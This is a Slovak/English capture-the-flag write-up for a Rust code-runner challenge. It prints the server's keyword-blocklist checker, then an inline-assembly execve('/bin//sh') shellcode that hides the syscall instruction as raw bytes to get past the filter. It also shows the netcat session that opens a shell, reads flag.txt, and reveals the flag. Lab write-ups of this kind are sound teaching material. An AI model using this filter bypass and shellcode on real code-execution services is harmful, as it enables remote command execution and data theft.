# Zadanie

EN: I made a Rust code interpreter where you can run your rust code. I made it very safe so you don’t hack me.

SK: Spravil som nástroj na spúšťanie Rust kódu. Je velmi bezpečný, nech ma nehackuješ.

`exp.cybergame.sk:7010`

**Súbory:**

- main.py

## Riešenie

Máme takýto skript

```python
import subprocess

HEADER = """
#![no_std]
#![no_main]
use core::panic::PanicInfo;
#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}
#[unsafe(no_mangle)]
pub extern "C" fn _start() -> () {
"""

FOOTER = """
}
"""

def checker(code):
    if code.count("!") > 1:
        return 0
    if "libc" in code:
        return 0
    if "std" in code:
        return 0
    if "flag" in code:
        return 0
    if "syscall" in code:
        return 0
    if "include" in code:
        return 0
    return 1

code = input("Give me code> ")
if not checker(code):
    print("Go away you hacker")
    exit()
with open("./src/main.rs", "w") as f:
    f.write(HEADER)           
    f.write(code)
    f.write(FOOTER)           

print("Building - this may take a while...",end="")
out = subprocess.run(
    ["cargo", "build", "--target", "x86_64-unknown-none"],
    capture_output=True,
    text=True  
)
if out.returncode:
    print("failed - exit")
    exit()
print("done")
print("Running...")
subprocess.run(["cargo", "run", "--target", "x86_64-unknown-none"])

```

ktorý na serveri vytvorí rust kód a s pevne definovaným začiatkom a koncom, kde telo viem definovať sám s určitými obmedzeniami a tento kód sa na serveri zbuidlí a spustí. Názov vlajky neviem, ideálne si vložiť telo, ktoré mi spawne shell, ale nesmiem použiť zakázané výrazy, ale môžem použiť assembly asm!, i keď výkričník len raz, ale bohato stačí

```rust
unsafe {
	core::arch::asm!("
		xor rdi, rdi
		push rdi
		mov rbx, 0x68732f2f6e69622f
		push rbx
		mov rdi, rsp
		xor rsi, rsi
		xor rdx, rdx
		mov rax, 59
		.byte 0x0f, 0x05
		", options(noreturn));
}
```

Upraviť do jedného riadku a zadať do konzoly.

```shell
nc exp.cybergame.sk 7010
Give me code> unsafe{core::arch::asm!("\nxor rdi, rdi\npush rdi\nmov rbx, 0x68732f2f6e69622f\npush rbx\nmov rdi, rsp\nxor rsi, rsi\nxor rdx, rdx\nmov rax, 59\n.byte 0x0f, 0x05\n", options(noreturn));}
Building - this may take a while...done
Running...
ls
Cargo.lock
Cargo.toml
flag.txt
main.py
src
target
cat flag.txt
SK-CERT{v3ry_600d_p3rf0rm4nc3}
```



## Vlajka

```
SK-CERT{v3ry_600d_p3rf0rm4nc3}
```
